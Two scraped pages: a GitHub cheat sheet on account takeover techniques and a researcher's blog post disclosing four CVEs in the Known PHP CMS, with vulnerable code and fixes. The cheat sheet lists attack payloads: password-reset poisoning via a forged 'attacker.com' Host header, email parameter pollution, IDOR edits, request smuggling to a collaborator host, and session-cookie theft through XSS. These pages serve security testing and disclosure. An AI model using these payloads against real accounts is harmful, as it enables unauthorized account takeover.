=== Content from github.com_f251652c_20250108_125210.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fswisskyrepo%2FPayloadsAllTheThings%2Ftree%2Fmaster%2FAccount%2520Takeover)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fswisskyrepo%2FPayloadsAllTheThings%2Ftree%2Fmaster%2FAccount%2520Takeover)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=swisskyrepo%2FPayloadsAllTheThings)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[swisskyrepo](/swisskyrepo)
/
**[PayloadsAllTheThings](/swisskyrepo/PayloadsAllTheThings)**
Public

* [Notifications](/login?return_to=%2Fswisskyrepo%2FPayloadsAllTheThings) You must be signed in to change notification settings
* [Fork
  14.9k](/login?return_to=%2Fswisskyrepo%2FPayloadsAllTheThings)
* [Star
   62.4k](/login?return_to=%2Fswisskyrepo%2FPayloadsAllTheThings)

* [Code](/swisskyrepo/PayloadsAllTheThings)
* [Pull requests
  4](/swisskyrepo/PayloadsAllTheThings/pulls)
* [Actions](/swisskyrepo/PayloadsAllTheThings/actions)
* [Projects
  0](/swisskyrepo/PayloadsAllTheThings/projects)
* [Security](/swisskyrepo/PayloadsAllTheThings/security)
* [Insights](/swisskyrepo/PayloadsAllTheThings/pulse)

Additional navigation options

* [Code](/swisskyrepo/PayloadsAllTheThings)
* [Pull requests](/swisskyrepo/PayloadsAllTheThings/pulls)
* [Actions](/swisskyrepo/PayloadsAllTheThings/actions)
* [Projects](/swisskyrepo/PayloadsAllTheThings/projects)
* [Security](/swisskyrepo/PayloadsAllTheThings/security)
* [Insights](/swisskyrepo/PayloadsAllTheThings/pulse)

## Files

 master
## Breadcrumbs

1. [PayloadsAllTheThings](/swisskyrepo/PayloadsAllTheThings/tree/master)
/
# Account Takeover

/
## Directory actions

## More options

## Directory actions

## More options

## Latest commit

## History

[History](/swisskyrepo/PayloadsAllTheThings/commits/master/Account%20Takeover) master
## Breadcrumbs

1. [PayloadsAllTheThings](/swisskyrepo/PayloadsAllTheThings/tree/master)
/
# Account Takeover

/Top
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| parent directory[..](/swisskyrepo/PayloadsAllTheThings/tree/master) | | |
| [README.md](/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/README.md "README.md") | | [README.md](/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/README.md "README.md") |  |  |
| [mfa-bypass.md](/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md "mfa-bypass.md") | | [mfa-bypass.md](/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md "mfa-bypass.md") |  |  |
| View all files | | |

## [README.md](#readme)

# Account Takeover

> Account Takeover (ATO) is a significant threat in the cybersecurity landscape, involving unauthorized access to users' accounts through various attack vectors.

## Summary

* [Password Reset Feature](#password-reset-feature)
  + [Password Reset Token Leak via Referrer](#password-reset-token-leak-via-referrer)
  + [Account Takeover Through Password Reset Poisoning](#account-takeover-through-password-reset-poisoning)
  + [Password Reset via Email Parameter](#password-reset-via-email-parameter)
  + [IDOR on API Parameters](#idor-on-api-parameters)
  + [Weak Password Reset Token](#weak-password-reset-token)
  + [Leaking Password Reset Token](#leaking-password-reset-token)
  + [Password Reset via Username Collision](#password-reset-via-username-collision)
  + [Account Takeover Due To Unicode Normalization Issue](#account-takeover-due-to-unicode-normalization-issue)
* [Account Takeover via Web Vulneralities](#account-takeover-via-web-vulneralities)
  + [Account Takeover via Cross Site Scripting](#account-takeover-via-cross-site-scripting)
  + [Account Takeover via HTTP Request Smuggling](#account-takeover-via-http-request-smuggling)
  + [Account Takeover via CSRF](#account-takeover-via-csrf)
* [References](#references)

## Password Reset Feature

### Password Reset Token Leak via Referrer

1. Request password reset to your email address
2. Click on the password reset link
3. Don't change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Account Takeover Through Password Reset Poisoning

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header

   ```
   POST https://example.com/reset.php HTTP/1.1
   Accept: */*
   Content-Type: application/json
   Host: attacker.com
   ```
4. Look for a password reset URL based on the *host header* like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset via Email Parameter

```
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

### IDOR on API Parameters

1. Attacker have to login with their account and go to the **Change password** feature.
2. Start the Burp Suite and Intercept the request
3. Send it to the repeater tab and edit the parameters : User ID/email

   ```
   POST /api/changepass
   [...]
   ("form": {"email":"victim@email.com","password":"securepwd"})
   ```

### Weak Password Reset Token

The password reset token should be randomly generated and unique every time.
Try to determine if the token expire or if it's always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.

* Timestamp
* UserID
* Email of User
* Firstname and Lastname
* Date of Birth
* Cryptography
* Number only
* Small token sequence (<6 characters between [A-Z,a-z,0-9])
* Token reuse
* Token expiration date

### Leaking Password Reset Token

1. Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com
2. Inspect the server response and check for `resetToken`
3. Then use the token in an URL like `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset via Username Collision

1. Register on the system with a username identical to the victim's username, but with white spaces inserted before and/or after the username. e.g: `"admin "`
2. Request a password reset with your malicious username.
3. Use the token sent to your email and reset the victim password.
4. Connect to the victim account with the new password.

The platform CTFd was vulnerable to this attack.
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Due To Unicode Normalization Issue

When processing user input involving unicode for case mapping or normalisation, unexcepted behavior can occur.

* Victim account: `demo@gmail.com`
* Attacker account: `demⓞ@gmail.com`

[Unisub - is a tool that can suggest potential unicode characters that may be converted to a given character](https://github.com/tomnomnom/hacks/tree/master/unisub).

[Unicode pentester cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/) can be used to find list of suitable unicode characters based on platform.

## Account Takeover via Web Vulneralities

### Account Takeover via Cross Site Scripting

1. Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : `*.domain.com`
2. Leak the current **sessions cookie**
3. Authenticate as the user using the cookie

### Account Takeover via HTTP Request Smuggling

Refer to **HTTP Request Smuggling** vulnerability page.

1. Use **smuggler** to detect the type of HTTP Request Smuggling (CL, TE, CL.TE)

   ```
   git clone https://github.com/defparam/smuggler.git
   cd smuggler
   python3 smuggler.py -h
   ```
2. Craft a request which will overwrite the `POST / HTTP/1.1` with the following data:

   ```
   GET http://something.burpcollaborator.net  HTTP/1.1
   X:
   ```
3. Final request could look like the following

   ```
   GET /  HTTP/1.1
   Transfer-Encoding: chunked
   Host: something.com
   User-Agent: Smuggler/v1.0
   Content-Length: 83

   0

   GET http://something.burpcollaborator.net  HTTP/1.1
   X: X
   ```

Hackerone reports exploiting this bug

* <https://hackerone.com/reports/737140>
* <https://hackerone.com/reports/771666>

### Account Takeover via CSRF

1. Create a payload for the CSRF, e.g: "HTML form with auto submit for a password change"
2. Send the payload

### Account Takeover via JWT

JSON Web Token might be used to authenticate an user.

* Edit the JWT with another User ID / Email
* Check for weak JWT signature

## References

* [$6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato - Bug Bounty Reports Explained - August 30, 2020](https://www.youtube.com/watch?v=gzM4wWA7RFo)
* [10 Password Reset Flaws - Anugrah SR - September 16, 2020](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
* [Broken Cryptography & Account Takeovers - Harsh Bothra - September 20, 2020](https://speakerdeck.com/harshbothra/broken-cryptography-and-account-takeovers?slide=28)
* [CTFd Account Takeover - NIST National Vulnerability Database - March 29, 2020](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
* [Hacking Grindr Accounts with Copy and Paste - Troy Hunt - October 3, 2020](https://www.troyhunt.com/hacking-grindr-accounts-with-copy-and-paste/)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from blog.jitendrapatro.me_f9206ac0_20250108_125209.html ===

[Skip to content](#content)

[Jitendra Patro](https://blog.jitendrapatro.me/ "Jitendra Patro")

It's only "not easy" until you learn how.

[Menu](#header-menu-responsive "Menu")

* [Home](https://blog.jitendrapatro.me/)
* [Blog](https://blog.jitendrapatro.me/posts/)
* [Projects](https://blog.jitendrapatro.me/category/projects/)
* [Writeups](https://blog.jitendrapatro.me/category/writeups/)
  + [Advisories](https://blog.jitendrapatro.me/category/writeups/advisories/)
    - [CVE writeups](https://blog.jitendrapatro.me/category/writeups/advisories/cve-writeups/)
    - [Not CVE writeups](https://blog.jitendrapatro.me/category/writeups/advisories/not-cve-writeups/)
  + [Android](https://blog.jitendrapatro.me/category/writeups/android/)
  + [Radio/Satellite Hacks](https://blog.jitendrapatro.me/category/writeups/radio-satellite-hacks/)
  + [Secure Code Warrior](https://blog.jitendrapatro.me/category/writeups/secure-code-warrior/)
    - [PHP Basic](https://blog.jitendrapatro.me/category/writeups/secure-code-warrior/php-basic/)
  + [HW Hacks](https://blog.jitendrapatro.me/category/writeups/hardware-hacks/)

![CVE](https://blog.jitendrapatro.me/wp-content/uploads/2022/07/xcve.jpg.pagespeed.ic.bFTFbD_ihD.webp)

CVE - Common Vulnerabilities and Exposures

# Multiple Vulnerabilities in Idno – Known PHP CMS software

by [Phoenix](https://blog.jitendrapatro.me/author/ab3tt0r/)Posted on[July 4, 2022March 12, 2023](https://blog.jitendrapatro.me/multiple-vulnerabilities-in-idno-known-php-cms-software/)⏱ 15 mins read

## Introduction

My journey into Source code security auditing started back in October 2021, when I was creating an intentionally vulnerable Linux machine for online hacking. I had to audit and modify the **PHP** source code of a popular WordPress Plugin to create a payload for an exploitable vulnerability of my machine. Next, in December 2021 a Recruiter provided me with a challenge to find vulnerabilities in *two files* of C# code. Honestly, back then I didn’t knew what C# is and had never seen any C# code in my life before. But I accepted the challenge anyways and to my amazement I was able to find multiple vulnerabilities in the *first page* of C# code within two hours!! The second page of code was dead simple and the vulnerability was pretty clear, but the **Recruiter** suggested that there are actually multiple vulnerabilities in that page. So, I *tried harder* and after a few hours of reading the official C# docs I was able to find two more vulnerabilities in the code. I went from not knowing about the existence of a programming language to finding *multiple vulnerabilities* in its code within two days!

Although the **Recruiter** didn’t hire me, his test gave me a lesson that’s far more valuable, i.e I learned to always believe in myself and my abilities. I figured out that If I can find vulnerabilities in the code of an obscure language like C#, then I can easily find vulnerabilities in more popular languages like **PHP** which has a clear cut syntax and is extremely easy to read and understand. Next, after a couple of months I was introduced to [Secure Code Warrior](https://www.securecodewarrior.com/) which further boosted my confidence in [Source code security auditing](https://blog.jitendrapatro.me/category/writeups/secure-code-warrior/php-basic/). And today, I’m disclosing multiple vulnerabilities in a popular PHP CMS project on Github. Also, as the [vendor](https://github.com/idno/known) didn’t respond to my multiple attempts at contacting them, these vulnerabilities are not patched yet, which is why I’m only going to show the vulnerable source code and the remediation action that must be taken and will not be disclosing any of the **PoC** that I’d submitted to [MITRE](https://cve.mitre.org/). So, without further ado, let’s get started.

## Table of Contents

* [The Vendor](#The-Vendor)

* [CVE-2022-30852 :- Idno Known version <= 1.3.1 is vulnerable to Insecure Direct Object Reference(IDOR).](#CVE-2022-30852-:--Known-version-<=-1.3.1-is-vulnerable-to-Insecure-Direct-Object-Reference(IDOR).)
  + [Timeline](#timeline)
  + [The Vulnerability](#The-Vulnerability)
  + [The Remediation](#The-Remediation)
  + [Afterthought](#Afterthought)

* [CVE-2022-31290 :- Idno Known version <= 1.3.1 is vulnerable to multiple Stored Cross Site Scripting(XSS) attacks.](#CVE-2022-31290-:--Idno-Known-version-<=-1.3.1-is-vulnerable-to-multiple-Stored-Cross-Site-Scripting(XSS)-attacks.)
  + [Timeline](#Timeline-2)
  + [The Vulnerability](#The-Vulnerability-2)
  + [The Remediation](#The-Remediation-2)

* [CVE-2022-32115 :- Idno Known version <= 1.3.1 is vulnerable to arbitrary Javascript execution due to improper SVG validation.](#CVE-2022-32115-:--Idno-Known-version-<=-1.3.1-is-vulnerable-to-arbitrary-Javascript-execution-due-to-improper-SVG-validation.)
  + [Timeline](#Timeline-3)
  + [The Vulnerability](#The-Vulnerability-3)
  + [The Remediation](#The-Remediation-3)

* [CVE-2022-33011 :- Idno Known version <=1.3.1 is vulnerable to Account Takeover via Password Reset Poisoning through HTTP Host header injection attack.](#CVE-2022-33011-:--Idno-Known-version-<=1.3.1-is-vulnerable-to-Account-Takeover-via-a-HTTP-Host-header-injection-attack.)
  + [Timeline](#Timeline-4)
  + [The Vulnerability](#The-Vulnerability-4)
  + [The Remediation](#The-Remediation-4)
* [Credits](#Credits)
* [Coordinated Disclosure Attempts](#Coordinated-Disclosure-Attempts)
* [Conclusion](#Conclusion)

## The Vendor

[Known](https://github.com/idno/known) is a social publishing platform owned by the guys at <https://withknown.com/>. The have some *badass* tight coding practices. Their SQL injection prevention coding methodology is top notch and even though I was able to produce a classic MySQL error, I was not able to turn that into an exploit. When I looked into their code, I saw some really tight security practices to prevent SQL injection. I think some of the vulnerabilities below are more of an oversight by the **[Known Team](https://withknown.com/)** rather than bad security practices.

## [CVE-2022-30852](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CVE-2022-30852) :- Known version <= 1.3.1 is vulnerable to Insecure Direct Object Reference(IDOR).

### Timeline

**10/05/2022** – Found the vulnerability and submitted a CVE request to MITRE.

**16/05/2022** – CVE Record created.

**10/06/2022** – Got mail from MITRE about three vulnerabilities(submitted on different dates) getting a **CVE ID** allocated.

**11/06/2022** – Sent first mail to vendor mentioning about the vulnerabilities.

**28/06/2022** – Sent third mail mentioning **four** vulnerabilities.

**04/07/2022** – Publicly disclosed the vulnerability without PoC.

### The Vulnerability

While reading the code for pages that allow access to admin panel to a normal user, I found one page which allows any logged-in user to access certain settings of admin panel that allows to turn off content being displayed on the Site frontend. The vulnerable functions are getContent() and postContent() of Homepage class under the namespace Idno\Pages\Admin. While every other settings page under the Admin panel is secured with the adminGatekeeper() function which ensures only the site Administrators can access the admin panel, the Homepage class is not. This is the adminGatekeeper() code:-

```
/**
         * Placed in pages to ensure that only logged-in site administrators can
         * get at them. Sets response code 401 and tries to forward
         * to the front page.
         */
        function adminGatekeeper()
        {
            $ok = false;
            if (\Idno\Core\Idno::site()->session()->isLoggedIn()) {
                if (\Idno\Core\Idno::site()->session()->currentUser()->isAdmin()) {
                    $ok = true;
                }
            }
            if (!$ok) {
                $this->deniedContent();
            }
        }
```

Now, every settings page in Admin panel is secured using the adminGatekeeper() function except one and that page allows any **logged-in user** to access the settings. The vulnerable code is as follows:-

![](https://blog.jitendrapatro.me/wp-content/uploads/2022/07/xcreategatekeeper-1024x300.png.pagespeed.ic.glCACUb_C6.webp)

createGatekeeper() function used instead of adminGatekeeper()

![](https://blog.jitendrapatro.me/wp-content/uploads/2022/07/xpostcontent-1024x233.png.pagespeed.ic.WOKpzkZY9b.webp)

createGatekeeper() function used instead of adminGatekeeper()

I’m sorry but as this vulnerability is not patched yet, I’m unable to disclose more details. Also, as this vulnerability is *extremely* easy to exploit, I used images instead of the original source code to make it *slightly* harder for anyone to copy and search, not that it’d stop anyone determined to exploit the vulnerability, but still it’s something.

### The Remediation

To be honest, this vulnerability is *easiest* to patch out of the four vulnerabilities. Just replace

$this->createGatekeeper **with** $this->adminGatekeeper.

![](https://blog.jitendrapatro.me/wp-content/uploads/2022/07/xpatched-1024x543.png.pagespeed.ic.p4zm3md-aG.webp)

createGatekeeper() function replaced with adminGatekeeper()

My Github pull request for the above vulnerability was approved by the vendor and the code changes can be viewed through [this link](https://github.com/idno/known/pull/3101/commits/0b06c2fb05dcb9aa154ba078b560021fc07e7c03).

### Afterthought

I’d say this vulnerability is more of an oversight than insecure coding practice. I think there are two possible reasons why such a mistake happened:-

1. The person writing the code for other admin panel pages could be different than the one writing the code for the vulnerable page.
2. Maybe the person writing the code thought that he is writing code for the homepage on the frontend and as such restricted the settings in admin panel to *logged-in* users only.

## [CVE-2022-31290](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CVE-2022-31290) :- Idno Known version <= 1.3.1 is vulnerable to multiple Stored Cross Site Scripting(XSS) attacks.

### Timeline

**16/05/2022** – Found the vulnerability and submitted a CVE request to MITRE.

**23/05/2022** – CVE Record created.

**10/06/2022** – Got mail from MITRE about three vulnerabilities(submitted on different dates) getting a **CVE ID** allocated.

**11/06/2022** – Sent first mail to vendor mentioning about the vulnerabilities.

**28/06/2022** – Sent third mail mentioning **four** vulnerabilities.

**04/07/2022** – Publicly disclosed the vulnerabilities.

### The Vulnerability

This vulnerability can be split into two categories:-

1. Stored XSS without Admin Privileges.
2. Stored XSS with Admin Privileges.

**Stored XSS without Admin Privileges.**

The vulnerable code is :-

![](https://blog.jitendrapatro.me/wp-content/uploads/2022/07/xXSS_user-1024x169.png.pagespeed.ic.W8cn6w7O1m.webp)

In the above code you can see that the “name” input field is vulnerable to Stored XSS. They’re using the secure htmlspecialchars() function but instead of validating the user supplied input they are trying to fetch some user details using the ‘user’ variable.

**Stored XSS with Admin Privileges.**

The vulnerable pieces of code are:-

![](https://blog.jitendrapatro.me/wp-content/uploads/2022/07/xstored-1024x409.png.pagespeed.ic.zokAyeaKUg.webp)

The problem is same as above but a bit serious as the two input fields shown above affect the entire site. The htmlspecialchars() function was used but instead of validating user supplied input it is applied on a value that was pre-determined and was being fetched from the config.

### The Remediation

The remediation is easy but would depend upon the devs what they want to do. For example, they can implement something like this:-

```
<?php echo htmlspecialchars($request->getParsedBody()['user-input'], ENT_QUOTES); ?>
```

Instead of validating a predetermined value, the user supplied input can be validated by parsing the HTTP request body for user input and then passing the value to the htmlspecialchars() function. I think Guzzle HTTP, which is a dependency of [**Known**](https://github.com/idno/known), has something similar.

## [CVE-2022-32115](//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32115) :- Idno Known version <= 1.3.1 is vulnerable to arbitrary Javascript execution due to improper SVG validation.

### Timeline

**30/05/2022** – Submitted a CVE request to MITRE.

**31/05/2022** – CVE Record created.

**10/06/2022** – Got mail from MITRE about three vulnerabilities(submitted on different dates) getting a **CVE ID** allocated.

**11/06/2022** – Sent first mail to vendor mentioning about the vulnerabilities.

**28/06/2022** – Sent third mail mentioning **four** vulnerabilities.

**04/07/2022** – Publicly disclosed the vulnerability without PoC.

### The Vulnerability

So, the story goes like this:- I was looking for file upload vulnerabilities for almost two days and was going through their code which handles all image file related issues. Suddenly, I saw something that made me very happy. It was this piece of code:-

```
        /**
         * Given a file and an original file path, determines whether this file is an SVG
         *
         * @param  $file_path
         * @return bool
         */
        public static function isSVG($file_path, $original_file_path)
        {
            if (pathinfo($original_file_path, PATHINFO_EXTENSION) == 'svg') {
                return true; // TODO better SVG validation would be nice
            }

            return false;
        }
```

On my first look, I didn’t considered this function anything interesting as many PHP projects that I’ve tested create a function at one place but do validation on it at another place. I was going to move on to read the rest of the code, but suddenly something in this code struck me! Guess what? The friendly “**TODO**” note left by the devs. 🙂

```
// TODO better SVG validation would be nice
```

I was going hard on the code for two days and this one line lit me up! No freaking SVG validation!! That’s like a hacker’s goldmine! As a reference, I’m leaving you guys [this guide](https://github.com/allanlw/svg-cheatsheet) which will show you what’s possible with arbitrary SVG file uploads. Guess what’s the next thing I do? I went straight to the frontend and uploaded a classic SVG XSS payload file and by just clicking on the file I got XSS! But this vulnerability was in the latest Github release of [idno/known](https://github.com/idno/known) software and not in the version that was supported by security updates. I know right, you might be thinking **Latest release** was not supported by security updates? Well, ask the devs about that. The problem now was, in the *dev* version(supported by security updates) of **[Known](https://github.com/idno/known)** my previous payload was not working even though the isSVG() function was still the same as above. I quickly ran a diff against the two files and found this code was added:-

```
        /**
         * Detects whether the file contains PHP or script tags, eg to check for embedded code in GIFs
         * @param $file_path
         * @return bool
         */
        public static function isFileFreeFromScriptTags($file_path)
        {
            if ($contents = file_get_contents($file_path)) {
                if (stripos($contents, '<script') || stripos($contents, '<?php')) return false;
                return true;
            }
            return false;
        }
```

So, now they’ve implemented script tags validation. But, if you’ve a attacker’s mindset like me, then you can immediately see that the above code is still not enough to prevent XSS. Although, the above code prevents *another* vulnerability that I found in a few other PHP CMS webapps, it didn’t prevent the vulnerability that I got the CVE for! After trying out a couple of payloads, I was able to bypass the above protection.

### The Remediation

Better SVG validation would be nice! 🙂 More seriously though, the *best* option in my opinion would be to disable SVG files support altogether. I mean more than 90% vendors in the world have dropped SVG files support from their webapp. Now, it’s entirely upto the **[Known](https://github.com/idno/known)** team whether they would like to support SVG files or not. But, if you look clearly at the [timeline](#Timeline-3) of this vulnerability above, you’ll notice that **MITRE** created a CVE record for this vulnerability within one day! The problem here is not just XSS, there are a lot of [other vulnerabilities](https://github.com/allanlw/svg-cheatsheet) that can be exploited via this vector! Also, another tip for the **[Known](https://github.com/idno/known)** team, using filters like <?php won’t stop an attacker as they can still use PHP [short\_open\_tag](https://www.php.net/manual/en/ini.core.php#ini.short-open-tag) to bypass the filter. I’d say keep the above filter code as it is(it prevents some other vulnerabilities) and just add more filters to it ***or*** if the **Known** team is not against added dependencies, then maybe use some library that does the heavy lifting for them.

## [CVE-2022-33011](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-33011) :- Idno Known version <=1.3.1 is vulnerable to Account Takeover via Password Reset Poisoning through HTTP Host header injection attack.

### Timeline

**08/06/2022** – Submitted a CVE request to MITRE.

**13/06/2022** – CVE Record created.

**28/06/2022** – Got mail from MITRE mentioning that a **CVE ID** is allocated.

**28/06/2022** – Sent third mail mentioning **four** vulnerabilities including this one.

**04/07/2022** – Publicly disclosed the vulnerability.

### The Vulnerability

The vulnerable code is :-

```
  /**
         * Attempt to detect your known configuration's server name.
         */
        protected function detectBaseURL()
        {

            // Otherwise, use the standard server name header
            if (!empty($_SERVER['SERVER_NAME'])) {

                // Servername specified, so we can construct things in the normal way.
                $url = (\Idno\Common\Page::isSSL() ? 'https://' : 'http://') . $_SERVER['SERVER_NAME'];
                if (!empty($_SERVER['HTTP_X_FORWARDED_PORT'])) {
                    if ($_SERVER['HTTP_X_FORWARDED_PORT'] != 80 && $_SERVER['HTTP_X_FORWARDED_PORT'] != 443) {
                        $url .= ':' . $_SERVER['HTTP_X_FORWARDED_PORT'];
                    }
                } else if (!empty($_SERVER['SERVER_PORT'])) {
                    if ($_SERVER['SERVER_PORT'] != 80 && $_SERVER['SERVER_PORT'] != 443) {
                        $url .= ':' . $_SERVER['SERVER_PORT'];
                    }
                }
                if (defined('KNOWN_SUBDIRECTORY')) {
                    $url .= '/' . KNOWN_SUBDIRECTORY;
                }
                $url .= '/'; // A naive default base URL
                return $url;
            }

            $domain = getenv('KNOWN_DOMAIN');
            if (!empty($domain)) {
                // Server domain specified in environment variable, for cases when SERVER_NAME isn't specified.
                // This allows things like the console plugins to access the correct site when using domain
                // specific configurations.

                $url = (\Idno\Common\Page::isSSL() ? 'https://' : 'http://') . $domain;
                $port = getenv('KNOWN_PORT');
                if (!$port) {
                    $port = 80;
                }

                if ($port != 80 && $port != 443) {
                    $url .= ':' . $port;
                }

                if (defined('KNOWN_SUBDIRECTORY')) {
                    $url .= '/' . KNOWN_SUBDIRECTORY;
                }
                $url .= '/'; // A naive default base URL
                return $url;
            }

            // No servername set, try something else
            // TODO: Detect servername using other methods (but don't use HTTP_HOST)

            // Default to root relative urls
            return '/';
        }
```

Now that you know about the vulnerability can you detect from the above code where the vulnerability actually is? The funny thing is that the devs *again* left for us another nice **TODO** mentioning that there can be certain cases where ServerName may not be set which could lead to HTTP Host header injection. Now, the mention of “but don’t use HTTP\_HOST” shows that the devs are completely aware of the risks of HTTP Host header injection attacks, but what I think they’re not aware of is that the “SERVER\_NAME” element of $\_SERVER variable can also be vulnerable if some checks are not implemented.

![](https://blog.jitendrapatro.me/wp-content/uploads/2022/07/xservername-1024x291.png.pagespeed.ic.N-ZRL8NN8G.webp)

The [UseCanonicalName](https://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname) is an important directive in cases when **Apache** needs to create self-referential URLs, which is exactly the case of this vulnerability. I’ve not checked with **Nginx** but my test with **Apache2** webserver shows that it is vulnerable to HTTP Host header injection attack. By the way, as you can see from the image above, **PHP** themselves are *against* relying on “SERVER\_NAME” value for security. **Note**, some security blogs mention explicitly to use “SERVER\_NAME” over “HTTP\_HOST” but none of them mentions the above fact that the “SERVER\_NAME” element can also be vulnerable.

### The Remediation

My recommendation would be to save the “domain name” of the Known server somewhere in a config file and then refer to that “domain name” value from the config file for creating password reset URLs instead of depending on the HTTP Host header to create password reset URLs. I think this is the easiest way to prevent the Password Reset Poisoning attack and in my experience I’ve seen a few other PHP CMS webapps use this technique. Also, the guys from [PortSwigger](https://portswigger.net/) has [some other neat recommendations](https://portswigger.net/web-security/host-header#how-to-prevent-http-host-header-attacks), which I think could be useful for the **[Known](https://github.com/idno/known)** devs.

## Credits

As I’m the sole person responsible for finding these vulnerabilities, all credit obviously goes to me. 🙂

## Coordinated Disclosure Attempts

I made three attempts to contact the **Known Security Team** according to [their security policy](https://github.com/idno/known/security/policy) on Github.

![](https://blog.jitendrapatro.me/wp-content/uploads/2022/07/ximage-1024x316.png.pagespeed.ic.fhczrnUbLi.webp)

The last **REMINDER** was sent on 28/06/2022 and today is 04/07/2022 and I still don’t have any response from them. I could’ve created an issue on Github but their security policy clearly mentions to report only to their Security Email. As they clearly mentioned that they’ll reply within *five days* of sending email and still they didn’t replied back, I finally decided to go ahead and publish the vulnerabilities.

## Conclusion

